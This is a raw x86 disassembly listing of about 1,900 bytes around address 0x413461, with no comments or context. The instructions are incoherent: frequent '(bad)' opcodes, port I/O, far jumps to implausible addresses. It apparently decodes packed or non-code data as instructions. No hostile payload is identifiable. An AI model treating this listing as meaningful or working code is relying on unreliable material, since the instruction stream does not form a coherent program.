  413461:	mov    bh,0x48
  413463:	fmul   QWORD PTR [ecx]
  413465:	add    BYTE PTR [ebx+0x47],cl
  413468:	sahf   
  413469:	jmp    0x4134aa
  41346b:	inc    esi
  41346c:	adc    BYTE PTR [ecx],0xad
  41346f:	cwde   
  413470:	fsubp  st(0),st
  413472:	cs retf 0x9eca
  413476:	inc    ebp
  413477:	sub    eax,0x23eb0860
  41347c:	out    0xce,eax
  41347e:	pop    ecx
  41347f:	xchg   ecx,eax
  413480:	jmp    0x570d:0xa4cc595a
  413487:	and    BYTE PTR [edx],0x88
  41348a:	enter  0x1b64,0x12
  41348e:	out    0x5f,eax
  413490:	push   es
  413491:	mov    eax,0x56070e32
  413496:	dec    edx
  413497:	mov    ch,0x13
  413499:	out    0x68,al
  41349b:	outs   dx,BYTE PTR ds:[esi]
  41349c:	sbb    DWORD PTR [ecx+0xc],0xffffffe3
  4134a0:	fstp   TBYTE PTR [edx]
  4134a2:	xchg   esi,eax
  4134a3:	mov    al,ds:0xf18a99bc
  4134a8:	pop    ecx
  4134a9:	cmp    DWORD PTR [edx+edi*8+0x4d],esi
  4134ad:	fmul   st,st(2)
  4134af:	retf   
  4134b0:	sub    eax,0x19b7b730
  4134b5:	in     eax,0xb7
  4134b7:	mov    esp,0xd9cad96f
  4134bc:	(bad)  
  4134bd:	popa   
  4134be:	aas    
  4134bf:	pushf  
  4134c0:	xchg   eax,edi
  4134c2:	inc    ecx
  4134c3:	in     al,0xef
  4134c5:	dec    edi
  4134c6:	addr16 js 0x413459
  4134c9:	mov    esp,0xc50e61c6
  4134ce:	mov    edi,0x481b0067
  4134d3:	mov    esp,0xd745048
  4134d8:	addr16 into 
  4134da:	pop    ds
  4134db:	cmp    ecx,DWORD PTR [ebp-0x27ca9fb0]
  4134e1:	(bad)  
  4134e2:	pop    ebx
  4134e3:	cmp    bh,BYTE PTR [edi-0x48]
  4134e6:	jmp    0x1bebf690
  4134eb:	dec    edx
  4134ec:	popa   
  4134ed:	in     al,0x27
  4134ef:	lea    eax,[ebx]
  4134f1:	or     ah,BYTE PTR ds:0xda5aed57
  4134f7:	ret    0x668
  4134fa:	enter  0x2eb5,0x15
  4134fe:	sub    eax,0x13acf5a4
  413503:	into   
  413504:	adc    BYTE PTR [edi+0xc],ch
  413507:	pop    ds
  413508:	jne    0x413545
  41350a:	add    ecx,ebp
  41350c:	sti    
  41350d:	fwait
  41350e:	jbe    0x41353d
  413510:	(bad)  
  413511:	mov    WORD PTR [esi+eax*1-0x602bf35e],gs
  413518:	push   ds
  413519:	push   ds
  41351a:	inc    esp
  41351b:	das    
  41351c:	or     dl,ah
  41351e:	cs out 0x39,al
  413521:	push   esp
  413522:	xchg   ecx,eax
  413523:	jmp    0x4134b1
  413525:	pop    ebp
  413526:	mov    bl,0xa7
  413528:	push   esp
  413529:	out    0x97,eax
  41352b:	push   ebp
  41352c:	popa   
  41352d:	mov    BYTE PTR [esi+0x4f714cee],dh
  413533:	(bad)  
  413534:	jb     0x413592
  413536:	jge    0x4134bf
  413538:	push   edx
  413539:	xchg   esp,eax
  41353a:	mov    eax,0x9f4ed903
  41353f:	xchg   edx,eax
  413540:	mov    WORD PTR [ecx+0x4767441c],?
  413546:	and    cl,BYTE PTR [edi+0x16]
  413549:	(bad)  
  41354a:	cli    
  41354b:	xchg   ebp,eax
  41354c:	loop   0x413568
  41354e:	inc    ebx
  41354f:	(bad)  
  413551:	xchg   ebx,eax
  413552:	inc    edi
  413553:	add    BYTE PTR [edx+0xd],ch
  413556:	xor    al,0x71
  413558:	push   ebp
  413559:	pop    esp
  41355a:	pop    ebp
  41355b:	je     0x413537
  41355d:	lods   al,BYTE PTR ds:[esi]
  41355e:	sub    eax,0xb2cbd017
  413563:	cli    
  413564:	inc    ebx
  413565:	dec    edi
  413566:	xor    al,0xd2
  413568:	or     BYTE PTR [edi-0x135944cd],ch
  41356e:	mov    ch,bh
  413570:	mov    eax,DWORD PTR [ebp+0x4d]
  413573:	aas    
  413574:	and    al,0xa9
  413576:	mov    al,0x38
  413578:	push   ecx
  413579:	add    BYTE PTR [esi+0x5e],cl
  41357c:	push   DWORD PTR [ecx]
  41357e:	lods   eax,DWORD PTR ds:[esi]
  41357f:	xchg   edx,eax
  413580:	out    0x91,eax
  413582:	fcmove st,st(3)
  413584:	sub    BYTE PTR [ecx],cl
  413586:	or     eax,DWORD PTR [edi-0x60]
  413589:	pop    edi
  41358a:	clc    
  41358b:	or     BYTE PTR [edx],bh
  41358d:	enter  0x8def,0xf4
  413591:	mov    ds,WORD PTR [ecx+0x79]
  413594:	pop    esp
  413595:	rol    BYTE PTR [esi-0x2bb96482],0x16
  41359c:	xchg   esi,eax
  41359d:	pop    ss
  41359e:	(bad)  
  41359f:	xchg   edi,eax
  4135a0:	lock pop edx
  4135a2:	or     BYTE PTR [ecx],dl
  4135a4:	test   DWORD PTR [ebp-0x4ed0a99c],ecx
  4135aa:	cmp    BYTE PTR [edx-0x8cac927],cl
  4135b0:	cmc    
  4135b1:	(bad)  
  4135b2:	addr16 inc ecx
  4135b4:	scas   al,BYTE PTR es:[edi]
  4135b5:	mov    WORD PTR [eax],gs
  4135b7:	mov    ebp,0x5d390e2d
  4135bc:	(bad)  
  4135bd:	xor    cl,ch
  4135bf:	mov    eax,ds:0x47541778
  4135c4:	aaa    
  4135c5:	sar    DWORD PTR [eax+0x7d],1
  4135c8:	xchg   esp,eax
  4135c9:	mov    ch,ch
  4135cb:	sbb    eax,0x5d6a9299
  4135d0:	ror    DWORD PTR [eax],cl
  4135d2:	push   ecx
  4135d3:	xchg   ecx,eax
  4135d4:	pushf  
  4135d5:	std    
  4135d6:	mov    edx,0xe0dac74e
  4135db:	add    ebx,esi
  4135dd:	xor    eax,0x7c5bec52
  4135e2:	lods   al,BYTE PTR ds:[esi]
  4135e3:	and    ah,BYTE PTR [edi+0x1393eab6]
  4135e9:	jecxz  0x4135d7
  4135eb:	cmp    edx,DWORD PTR [ecx]
  4135ed:	(bad)  
  4135ee:	imul   ebp,esp,0xa090884e
  4135f4:	and    al,0xb4
  4135f6:	pop    esi
  4135f7:	add    eax,0xd59e14f
  4135fc:	adc    ah,ch
  4135fe:	ret    0x8300
  413601:	jg     0x413682
  413603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413604:	test   BYTE PTR fs:[ecx],dl
  413607:	ret    0xdb48
  41360a:	mov    eax,0x33c36c14
  41360f:	fidivr WORD PTR [edi+edx*1]
  413612:	pop    ebp
  413613:	cmp    al,0x60
  413615:	(bad)  
  413616:	ins    DWORD PTR es:[edi],dx
  413617:	loope  0x4135bd
  413619:	sbb    bh,BYTE PTR [di+0x26e0]
  41361e:	test   eax,0xdd44379a
  413623:	sub    al,0xd0
  413625:	mov    DWORD PTR [ebx+0x764f0284],0x73492316
  41362f:	iret   
  413630:	adc    eax,0x6a6077fe
  413635:	test   BYTE PTR [ebp+edi*2-0x4021aed6],dl
  41363c:	dec    ebx
  41363d:	sbb    esp,DWORD PTR [eax]
  41363f:	aas    
  413640:	inc    ecx
  413641:	dec    eax
  413642:	or     esp,esi
  413644:	jbe    0x4135e2
  413646:	aaa    
  413647:	daa    
  413648:	or     esi,ecx
  41364a:	or     dh,BYTE PTR [esi+0x4e0ca3a4]
  413650:	pop    esi
  413651:	jecxz  0x4136ab
  413653:	sub    dl,BYTE PTR [esi-0x4c]
  413656:	cmp    al,BYTE PTR [ebp-0x68]
  413659:	inc    ebp
  41365a:	add    BYTE PTR [ecx+0x62ac5afb],dl
  413660:	mov    eax,ds:0x7d15ee0a
  413665:	adc    ah,BYTE PTR [eax-0xe26c0e7]
  41366b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41366c:	(bad)  
  41366d:	dec    edx
  41366e:	add    ah,BYTE PTR [ebx]
  413670:	jg     0x4136d4
  413672:	push   0xc646892f
  413677:	cwde   
  413678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413679:	loop   0x41367e
  41367b:	and    al,0x73
  41367d:	test   DWORD PTR [edi+0x46],ebx
  413680:	int3   
  413681:	push   ds
  413682:	adc    DWORD PTR [ecx],esp
  413684:	sbb    BYTE PTR [esi+ebp*8-0x33117438],bh
  41368b:	(bad)  
  41368c:	pusha  
  41368d:	mov    bl,bh
  41368f:	sar    BYTE PTR [ebx+0x72],cl
  413692:	clc    
  413693:	fisub  WORD PTR [ebx]
  413695:	cmp    BYTE PTR [edi-0x26f8ccd1],0xaf
  41369c:	sbb    DWORD PTR [esp+ebp*2+0x54de6558],esi
  4136a3:	push   cs
  4136a4:	sti    
  4136a5:	mov    ecx,0x75e74ac1
  4136aa:	push   0xfffffff5
  4136ac:	shl    BYTE PTR [edx+0x7a43d109],0x12
  4136b3:	or     al,0x27
  4136b5:	bound  eax,QWORD PTR [ebx+edx*2+0x26f65b3e]
  4136bc:	add    al,0x83
  4136be:	cmp    ebp,DWORD PTR [esi+eiz*8]
  4136c1:	int3   
  4136c2:	cwde   
  4136c3:	sub    ebx,DWORD PTR [edx]
  4136c5:	ins    BYTE PTR es:[edi],dx
  4136c6:	hlt    
  4136c7:	ja     0x413718
  4136c9:	lea    eax,[edx+esi*2+0x43]
  4136cd:	shr    DWORD PTR [ebx+0x6473d186],1
  4136d3:	sbb    edi,edx
  4136d5:	jae    0x4136d3
  4136d7:	jmp    0x41370d
  4136d9:	outs   dx,DWORD PTR ds:[esi]
  4136da:	jb     0x413720
  4136dc:	mov    ebx,0x86701b20
  4136e1:	or     eax,0xa05b9c11
  4136e6:	icebp  
  4136e7:	fcomp  st(3)
  4136e9:	push   edx
  4136ea:	stos   BYTE PTR es:[edi],al
  4136eb:	xor    ebx,DWORD PTR ds:0x30ad4970
  4136f1:	inc    ecx
  4136f2:	pop    ds
  4136f3:	cmp    edx,edi
  4136f5:	gs ins BYTE PTR es:[edi],dx
  4136f7:	fcomi  st,st(7)
  4136f9:	inc    esp
  4136fa:	dec    eax
  4136fb:	push   ebp
  4136fc:	ss jge 0x413724
  4136ff:	loopne 0x4136e3
  413701:	mov    edx,0x6399768b
  413706:	in     eax,dx
  413707:	mov    edx,edx
  413709:	ror    ch,0x16
  41370c:	mov    cs,WORD PTR [esi]
  41370e:	pop    edx
  41370f:	scas   eax,DWORD PTR es:[edi]
  413710:	push   edx
  413711:	push   cs
  413712:	mov    bh,0xc3
  413714:	mov    ds:0x8616173c,eax
  413719:	shl    BYTE PTR [ecx+0x31a81efc],cl
  41371f:	pushf  
  413720:	jne    0x41378d
  413722:	and    ah,BYTE PTR [ecx-0x60cc807c]
  413728:	pushf  
  413729:	shl    DWORD PTR [esi],0x9b
  41372c:	shr    BYTE PTR [ebx],cl
  41372e:	push   esi
  41372f:	clc    
  413730:	sub    DWORD PTR [eax+0x32],edx
  413733:	mov    esp,0xc1576f30
  413738:	jmp    0xa45e830c
  41373d:	push   0xa339ba3b
  413742:	push   esi
  413743:	push   ecx
  413744:	xchg   ecx,eax
  413745:	test   DWORD PTR [edi],0x2bb98e6
  41374b:	mov    al,ds:0xa221cc9b
  413750:	repz pusha 
  413752:	loope  0x413715
  413754:	das    
  413755:	mov    eax,gs:0x1bcf51d0
  41375b:	(bad)
  41375e:	leave  
  41375f:	jnp    0x413779
  413761:	lods   al,BYTE PTR ds:[esi]
  413762:	aas    
  413763:	xchg   ebp,eax
  413764:	ins    BYTE PTR es:[edi],dx
  413765:	mov    dh,0x17
  413767:	jl     0x4137b4
  413769:	xor    ch,ch
  41376b:	pop    es
  41376c:	fwait
  41376d:	or     BYTE PTR [esi+0xc],al
  413770:	xor    al,0xd
  413772:	ja     0x4136fb
  413774:	inc    eax
  413775:	sub    eax,eax
  413777:	mov    eax,0x3cb737d3
  41377c:	pop    ebx
  41377d:	in     al,dx
  41377e:	jmp    0x1531ffe
  413783:	out    0x65,al
  413785:	cmc    
  413786:	sti    
  413787:	add    cl,BYTE PTR [ebp-0x6d]
  41378a:	je     0x41371d
  41378c:	or     dh,ah
  41378e:	xchg   ebp,eax
  41378f:	out    dx,eax
  413790:	mov    al,ds:0xd04d2459
  413795:	repz cmp edx,ebp
  413798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413799:	xor    ah,0x35
  41379c:	inc    edx
  41379d:	push   edi
  41379e:	out    dx,al
  41379f:	dec    ecx
  4137a0:	pop    es
  4137a1:	push   eax
  4137a2:	add    BYTE PTR [eax+edx*1+0x42],al
  4137a6:	jnp    0x413734
  4137a8:	aad    0xbc
  4137aa:	sub    eax,0x33044de0
  4137af:	or     ch,bl
  4137b1:	pop    eax
  4137b2:	les    ebx,FWORD PTR [esi]
  4137b4:	call   FWORD PTR [ebx+0x5bd390d0]
  4137ba:	mov    ds:0xda9599e5,eax
  4137bf:	out    0x80,al
  4137c1:	mov    edi,0x2b4c6c0f
  4137c6:	call   0xeaea54f8
  4137cb:	in     al,dx
  4137cc:	or     eax,DWORD PTR [ebx]
  4137ce:	mov    edi,0xceebbd0d
  4137d3:	nop
  4137d4:	dec    edx
  4137d5:	push   DWORD PTR [edi-0x7e1036f6]
  4137db:	mov    ds:0x80e76e01,al
  4137e0:	mov    edx,0x978748a1
  4137e5:	xor    bh,ch
  4137e7:	push   esp
  4137e8:	dec    esp
  4137e9:	dec    ebx
  4137ea:	pop    ebx
  4137eb:	popf   
  4137ec:	push   0xffffffa0
  4137ee:	loopne 0x4137ad
  4137f0:	adc    eax,edx
  4137f2:	xor    ebx,DWORD PTR [edi-0x64cd9edb]
  4137f8:	cs enter 0xe4ad,0x48
  4137fd:	xchg   DWORD PTR [ebx+eax*8+0x67],ebx
  413801:	int3   
  413802:	sub    bh,ah
  413804:	xor    edi,ebp
  413806:	ret    0x285a
  413809:	rcl    BYTE PTR [ecx+0x11e09070],cl
  41380f:	inc    edi
  413810:	mov    ebx,0x86c99045
  413815:	jl     0x4137ea
  413817:	lea    esp,[edx]
  413819:	inc    esi
  41381a:	sbb    BYTE PTR [edi],bl
  41381c:	sahf   
  41381d:	jae    0x41384f
  41381f:	out    dx,eax
  413820:	scas   eax,DWORD PTR es:[edi]
  413821:	arpl   WORD PTR [edx],sp
  413823:	test   DWORD PTR [ebx-0x65],0x90ab454e
  41382a:	fild   QWORD PTR [eax+ecx*1+0x28]
  41382e:	add    DWORD PTR [edx-0x55775c6],0x3793e5fe
  413838:	xchg   ecx,eax
  413839:	retf   
  41383a:	pop    ss
  41383b:	das    
  41383c:	sbb    bl,0x23
  41383f:	dec    edx
  413840:	cld    
  413841:	pop    esi
  413842:	jb     0x413834
  413844:	loope  0x413890
  413846:	loope  0x4138c7
  413848:	cs adc eax,0x9cb7b9d
  41384e:	jge    0x4138c4
  413850:	psubq  mm5,QWORD PTR [ebx-0x1bec2501]
  413857:	scas   ax,WORD PTR es:[edi]
  413859:	cmp    eax,0xf09029ab
  41385e:	jmp    0x69b5a63b
  413863:	cdq    
  413864:	leave  
  413865:	sub    DWORD PTR [ecx],ebp
  413867:	mov    dh,0xb9
  413869:	jns    0x4138b2
  41386b:	setnp  BYTE PTR [esi+0x795c5bad]
  413872:	xchg   BYTE PTR [edx+edx*1+0x4667f032],cl
  413879:	push   ebp
  41387a:	sti    
  41387b:	int    0x91
  41387d:	xchg   ebp,eax
  41387e:	ins    BYTE PTR es:[edi],dx
  41387f:	jp     0x41388f
  413881:	popa   
  413882:	jns    0x4138ae
  413884:	cs in  al,dx
  413886:	loope  0x413830
  413888:	fistp  WORD PTR [ebx+edx*2]
  41388b:	fwait
  41388c:	rol    BYTE PTR [edx],0x1e
  41388f:	lods   eax,DWORD PTR ds:[esi]
  413890:	xchg   ebp,eax
  413891:	sbb    BYTE PTR [ecx],bh
  413893:	std    
  413894:	(bad)  
  413895:	jmp    0x1a73c2b5
  41389a:	jne    0x4138f8
  41389c:	(bad)  
  41389d:	jge    0x413895
  41389f:	push   ebp
  4138a0:	lods   eax,DWORD PTR ds:[esi]
  4138a1:	mov    ch,0x94
  4138a3:	retf   0x331
  4138a6:	cmc    
  4138a7:	outs   dx,DWORD PTR ds:[esi]
  4138a8:	mov    dl,BYTE PTR [ecx]
  4138aa:	lahf   
  4138ab:	out    dx,eax
  4138ac:	adc    al,0x36
  4138ae:	pop    ebp
  4138af:	enter  0xf92a,0x9d
  4138b3:	mov    al,ds:0x64ff9ea2
  4138b8:	or     ch,al
  4138ba:	and    dh,BYTE PTR [ebx+ebp*8]
  4138bd:	aaa    
  4138be:	sbb    DWORD PTR [eax+0x6aafdb87],ebp
  4138c4:	out    dx,eax
  4138c5:	fcomp  st(1)
  4138c7:	jnp    0x4138f4
  4138c9:	in     eax,dx
  4138ca:	mov    ah,0x33
  4138cc:	daa    
  4138cd:	fwait
  4138ce:	(bad)  
  4138cf:	sbb    eax,0xea7f4975
  4138d4:	loopne 0x413954
  4138d6:	out    0xa3,al
  4138d8:	fsubr  QWORD PTR ds:0x494da278
  4138de:	out    0x83,eax
  4138e0:	push   eax
  4138e1:	mov    bl,0x31
  4138e3:	(bad)  
  4138e4:	mov    ah,0xe5
  4138e6:	repz clc 
  4138e8:	cmp    eax,0x4f3fcbf9
  4138ed:	pop    edi
  4138ee:	shl    DWORD PTR ds:0x4375168d,0xc4
  4138f5:	test   eax,0x96e33852
  4138fa:	xor    al,0xae
  4138fc:	adc    DWORD PTR [ecx-0x46],esp
  4138ff:	outs   dx,BYTE PTR ds:[esi]
  413900:	call   0xe81a:0xa4fa7cca
  413907:	dec    ecx
  413908:	inc    ebx
  413909:	rcr    DWORD PTR [ebx-0x6a],0xa9
  41390d:	jns    0x4138fa
  41390f:	cwde   
  413910:	mov    al,ds:0xa7764507
  413915:	mov    fs,WORD PTR ds:0x1a6915eb
  41391b:	xchg   ebp,eax
  41391c:	mov    DWORD PTR [ebx],ebx
  41391e:	enter  0xf058,0xcb
  413922:	fdivr  QWORD PTR [esi-0x7a0f9ac4]
  413928:	xchg   esp,eax
  413929:	scas   al,BYTE PTR es:[edi]
  41392a:	xchg   esi,eax
  41392b:	mov    al,0x19
  41392d:	xchg   DWORD PTR [edi],edx
  41392f:	jge    0x41393e
  413931:	in     eax,0xc0
  413933:	(bad)  
  413934:	(bad)  
  413935:	mov    edx,0xa048619f
  41393a:	mov    al,ds:0x754edd6d
  41393f:	add    BYTE PTR [ecx-0xe],bh
  413942:	js     0x41393b
  413944:	fadd   DWORD PTR [edx]
  413946:	xchg   ebp,eax
  413947:	inc    esp
  413948:	arpl   WORD PTR [ebx-0x8],dx
  41394b:	inc    edx
  41394c:	fsub   DWORD PTR [edx]
  41394e:	and    eax,DWORD PTR [ebx+0x37d83d48]
  413954:	add    eax,0xc665adec
  413959:	push   ebx
  41395a:	pop    ds
  41395b:	xor    BYTE PTR [esi-0x2bc2ca5c],bl
  413961:	dec    ebx
  413962:	jmp    0x69891c83
  413967:	mov    edx,0x36f35d69
  41396c:	pusha  
  41396d:	xor    BYTE PTR [ecx+0x23d42df2],bh
  413973:	out    0x25,al
  413975:	adc    al,0x8c
  413977:	cld    
  413978:	jns    0x41395e
  41397a:	mov    ch,0x34
  41397c:	ins    DWORD PTR es:[edi],dx
  41397d:	fdiv   DWORD PTR [edx+edx*2]
  413980:	xchg   BYTE PTR [edx+0x38],cl
  413983:	stos   BYTE PTR es:[edi],al
  413984:	aas    
  413985:	cmp    BYTE PTR [ebp-0xe4e9af5],ch
  41398b:	repnz mov ch,BYTE PTR [edi-0x3c21e161]
  413992:	jno    0x413a0a
  413994:	xchg   ecx,eax
  413995:	mov    ah,0x36
  413997:	fimul  DWORD PTR [eax+eiz*1-0x660ec92c]
  41399e:	pop    ebp
  41399f:	aad    0x85
  4139a1:	mov    al,ds:0x5b9036ff
  4139a6:	sub    eax,ecx
  4139a8:	sar    ecx,cl
  4139aa:	dec    ebx
  4139ab:	pop    es
  4139ac:	mov    esp,0xfa1d1277
  4139b1:	mov    ecx,edi
  4139b3:	cmp    bh,al
  4139b5:	daa    
  4139b6:	repz imul ebx,DWORD PTR [edi+0x7766e946],0x15
  4139be:	mov    edx,0x84a3fed
  4139c3:	lds    ecx,FWORD PTR [ebx+0x309576b8]
  4139c9:	lods   al,BYTE PTR ds:[esi]
  4139ca:	mov    bl,BYTE PTR [ecx+0x76]
  4139cd:	xor    DWORD PTR [edi],0xffffffc4
  4139d0:	js     0x4139a7
  4139d2:	ror    BYTE PTR [edx+0x619caa8d],1
  4139d8:	hlt    
  4139d9:	lahf   
  4139da:	and    DWORD PTR [esi+0x64a64820],edi
  4139e0:	cmp    BYTE PTR [edi+ebx*1],bl
  4139e3:	(bad)
  4139e8:	mov    al,0x70
  4139ea:	inc    ecx
  4139eb:	and    ecx,DWORD PTR [esi]
  4139ed:	push   es
  4139ee:	or     al,0xa0
  4139f0:	test   eax,0x243de15e
  4139f5:	mov    eax,esi
  4139f7:	out    dx,eax
  4139f8:	hlt    
  4139f9:	mov    eax,ds:0x8ca29f9e
  4139fe:	mov    ebp,0xa8fd011a
  413a03:	dec    esp
  413a04:	pusha  
  413a05:	inc    eax
  413a06:	pushf  
  413a07:	inc    esi
  413a08:	and    DWORD PTR [ecx-0x54],ecx
  413a0b:	test   BYTE PTR [ebp+0x24],0x28
  413a0f:	out    dx,al
  413a10:	(bad)  
  413a11:	sub    eax,eax
  413a13:	shl    DWORD PTR [ecx-0x47012c97],1
  413a19:	xor    ah,dl
  413a1b:	test   DWORD PTR [ebx-0x31769c0],ebp
  413a21:	mov    al,0xc0
  413a23:	fcom   QWORD PTR [ecx+0x4]
  413a26:	ret    
  413a27:	loopne 0x4139bc
  413a29:	push   0x18f1cc5e
  413a2e:	in     eax,0xdb
  413a30:	xor    al,0xb3
  413a32:	dec    ebx
  413a33:	jle    0x413a1d
  413a35:	je     0x413a11
  413a37:	sbb    ch,ch
  413a39:	xor    esi,edx
  413a3b:	mov    fs:0x7aea46fb,eax
  413a41:	jge    0x413a77
  413a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a44:	stos   DWORD PTR es:[edi],eax
  413a45:	sub    DWORD PTR [eax],ebp
  413a47:	rol    bh,cl
  413a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a4a:	imul   ebx,DWORD PTR [ecx],0xffffff97
  413a4d:	out    dx,eax
  413a4e:	daa    
  413a4f:	push   es
  413a50:	in     eax,0xb1
  413a52:	icebp  
  413a53:	inc    ebx
  413a54:	aaa    
  413a55:	test   DWORD PTR [esi-0x42],edx
  413a58:	mov    WORD PTR ss:[ecx],?
  413a5b:	arpl   WORD PTR [edi-0x2],ax
  413a5e:	sub    edx,DWORD PTR [edx+0x30]
  413a61:	(bad)  
  413a62:	jo     0x413a69
  413a64:	stos   BYTE PTR es:[edi],al
  413a65:	scas   eax,DWORD PTR es:[edi]
  413a66:	scas   eax,DWORD PTR es:[edi]
  413a67:	or     DWORD PTR [edx+edi*1+0x8],esp
  413a6b:	sar    esp,cl
  413a6d:	pop    esi
  413a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a6f:	hlt    
  413a70:	lock inc edx
  413a72:	ins    BYTE PTR es:[edi],dx
  413a73:	bound  esi,QWORD PTR [ebx]
  413a75:	jl     0x413a57
  413a77:	jmp    0x4055b59a
  413a7c:	loopne 0x413a8d
  413a7e:	mov    al,BYTE PTR [ebx]
  413a80:	sbb    BYTE PTR [ebx-0x1f],al
  413a83:	jecxz  0x413ac7
  413a85:	mov    ebp,ecx
  413a87:	inc    esi
  413a88:	loop   0x413b08
  413a8a:	cmp    BYTE PTR [edi-0x2e4bc5ed],bl
  413a90:	scas   eax,DWORD PTR es:[edi]
  413a91:	je     0x413aac
  413a93:	adc    eax,0xcba6d267
  413a98:	push   ebp
  413a99:	inc    edi
  413a9a:	dec    eax
  413a9b:	lods   eax,DWORD PTR ds:[esi]
  413a9c:	fmul   QWORD PTR [eax+0x4b]
  413a9f:	test   eax,0xfe4049e7
  413aa4:	hlt    
  413aa5:	or     ah,BYTE PTR [eax]
  413aa7:	dec    esp
  413aa8:	jns    0x413abb
  413aaa:	frstor [ecx-0x5]
  413aad:	adc    DWORD PTR [eax+0x3b022b6c],esp
  413ab3:	mov    al,BYTE PTR [ebp+0x6c5151e8]
  413ab9:	push   0xffffffee
  413abb:	push   edx
  413abc:	xor    BYTE PTR [ebx+0x4ac57f0a],al
  413ac2:	pop    esi
  413ac3:	xchg   edx,eax
  413ac4:	mov    edx,0x5718b22e
  413ac9:	shr    BYTE PTR [edi],1
  413acb:	inc    ebp
  413acc:	adc    BYTE PTR [eax-0x4d],dh
  413acf:	xchg   esp,eax
  413ad0:	ret    
  413ad1:	push   esi
  413ad2:	call   0x8a28a72a
  413ad7:	rcr    BYTE PTR [esp+eiz*8],cl
  413ada:	mov    ch,0x9
  413adc:	loope  0x413afe
  413ade:	outs   dx,BYTE PTR ds:[esi]
  413adf:	or     al,0x25
  413ae1:	xor    al,0xb2
  413ae3:	sbb    al,0xf3
  413ae5:	test   eax,ebx
  413ae7:	inc    ecx
  413ae8:	in     al,dx
  413ae9:	neg    DWORD PTR [esi+0x19f5a542]
  413aef:	jge    0x413b08
  413af1:	(bad)  
  413af2:	fnstcw WORD PTR [ebx-0x15]
  413af5:	mov    eax,0xb7087ab3
  413afa:	cmc    
  413afb:	adc    BYTE PTR [edx],ch
  413afd:	mov    ebp,0xfd1b701e
  413b02:	out    0xf6,eax
  413b04:	push   edx
  413b05:	das    
  413b06:	es lock jle 0x413b03
  413b0a:	mov    cl,0x53
  413b0c:	jmp    DWORD PTR [ebp-0x1f887936]
  413b12:	adc    al,0xcd
  413b14:	shl    esi,1
  413b16:	scas   eax,DWORD PTR es:[edi]
  413b17:	and    eax,esi
  413b19:	xor    al,0xa6
  413b1b:	lock inc edi
  413b1d:	es mov dh,0xce
  413b20:	sbb    al,0x53
  413b22:	in     eax,dx
  413b23:	fiadd  WORD PTR [bx+di-0x18]
  413b27:	jg     0x413ba6
  413b29:	ror    BYTE PTR [eax],cl
  413b2b:	out    dx,al
  413b2c:	je     0x413ae5
  413b2e:	mov    esi,0xe791cea6
  413b33:	push   ss
  413b34:	rcr    DWORD PTR [esi-0x1d2ab69a],1
  413b3a:	nop
  413b3b:	push   ss
  413b3c:	push   ecx
  413b3d:	cdq    
  413b3e:	jns    0x413b08
  413b40:	and    DWORD PTR [esi-0x26967785],esp
  413b46:	test   BYTE PTR [edx],ch
  413b48:	mov    eax,ds:0x9f13726d
  413b4d:	mov    ds:0x6cbb1353,eax
  413b52:	int3   
  413b53:	inc    edi
  413b54:	(bad)  
  413b55:	aam    0x4b
  413b57:	inc    ecx
  413b58:	cwde   
  413b59:	enter  0x9d7a,0x90
  413b5d:	push   0x11
  413b5f:	aam    0xc6
  413b61:	call   0xb86f:0xcdee1d6
  413b68:	inc    ecx
  413b69:	push   0x26
  413b6b:	inc    ecx
  413b6c:	js     0x413be1
  413b6e:	jge    0x413b51
  413b70:	mov    ds:0x48b433b0,al
  413b75:	nop
  413b76:	cs push ds
  413b78:	sub    al,0x9c
  413b7a:	ins    BYTE PTR es:[edi],dx
  413b7b:	mov    al,0x84
  413b7d:	das    
  413b7e:	xchg   ebx,eax
  413b7f:	fisubr DWORD PTR [ebx-0x44]
  413b82:	mov    edx,0x536116c1
  413b87:	stos   BYTE PTR es:[edi],al
  413b88:	cld    
  413b89:	test   edi,ebx
  413b8b:	sbb    BYTE PTR [ebx+0x54],0xb2
  413b8f:	pop    edx
  413b90:	xor    BYTE PTR [edx-0x72],al
  413b93:	cs icebp 
  413b95:	add    dl,BYTE PTR [eax-0x13]
  413b98:	push   ebp
  413b99:	hlt    
  413b9a:	sbb    ebp,ebx
  413b9c:	mov    ch,0xff
  413b9e:	mov    dl,0x5c
  413ba0:	dec    ebx
  413ba1:	gs or  eax,0xb366c708
  413ba7:	adc    eax,0xe4c55e86
  413bac:	inc    esp
  413bad:	aaa    
  413bae:	jmp    0x286f:0x8ac09607
  413bb5:	in     eax,0x85
  413bb7:	cmp    BYTE PTR [esi],0x67
  413bba:	jo     0x413bc2
  413bbc:	loopne 0x413c11
  413bbe:	popa   
  413bbf:	push   ss
  413bc0:	repz xor edx,DWORD PTR [ebx+0x7f3c6c85]
  413bc7:	popf   
  413bc8:	int3   
  413bc9:	les    edx,FWORD PTR [edi]
  413bcb:	mov    edi,0xb78c2bdc
  413bd0:	jmp    0xf126a73d
  413bd5:	mov    ah,0x5a
  413bd7:	pmaxsw mm5,QWORD PTR [ebx]
  413bda:	(bad)  
  413bdb:	jge    0x413ba5
  413bdd:	stos   DWORD PTR es:[edi],eax
  413bde:	inc    edi
  413bdf:	fdivr  QWORD PTR [ebx-0x2d]
  413be2:	mov    ch,0x6b
  413be4:	add    esi,DWORD PTR ds:0x11c8671
  413bea:	lods   al,BYTE PTR ds:[esi]
  413beb:	xor    ah,BYTE PTR [esi+0x39]
  413bee:	sahf   
  413bef:	or     al,0xd5
  413bf1:	xor    eax,0xf6c04358
  413bf6:	(bad)  
  413bf7:	into   
  413bf8:	enter  0x6a04,0x3b
  413bfc:	pop    eax
  413bfd:	push   edi
  413bfe:	cld    
  413bff:	pop    ecx
  413c00:	dec    esi
  413c01:	shl    DWORD PTR [ebx],cl
  413c03:	xor    DWORD PTR [ecx],0x245ecadd
  413c09:	mov    BYTE PTR [edx+ebp*2],ah
  413c0c:	bswap  esp
  413c0e:	sar    BYTE PTR [edi+ebx*8-0x6c],0xf0
  413c13:	push   edi
  413c14:	fsub   DWORD PTR [esi+ebp*1-0x3f9a4128]
  413c1b:	(bad)  
  413c1c:	mov    ah,0x99
  413c1e:	ror    BYTE PTR [ebp-0x4b],0x2c
  413c22:	stc    
  413c23:	and    eax,0x96ed11ee
  413c28:	int    0x4b
